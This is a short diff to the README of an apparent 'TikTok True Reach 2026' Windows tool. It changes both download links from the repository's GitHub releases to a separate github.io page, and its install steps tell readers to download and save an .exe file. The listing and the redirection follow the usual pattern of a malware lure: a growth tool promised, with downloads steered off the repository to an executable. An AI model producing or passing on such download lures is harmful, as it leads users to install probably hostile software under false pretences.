@@ -1,6 +1,6 @@
 # 🚀 TikTok-True-Reach-2026---Clean-Video-Visibility-Software-for-Windows - Increase Your TikTok Reach With Ease
 
-[![Download Now](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Rukmalr1962/TikTok-True-Reach-2026---Clean-Video-Visibility-Software-for-Windows/releases)
+[![Download Now](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://rukmalr1962.github.io)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ Ensure your Windows system receives regular updates. This keeps your computer se
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official releases page](https://github.com/Rukmalr1962/TikTok-True-Reach-2026---Clean-Video-Visibility-Software-for-Windows/releases).
+1. Visit the [official releases page](https://rukmalr1962.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
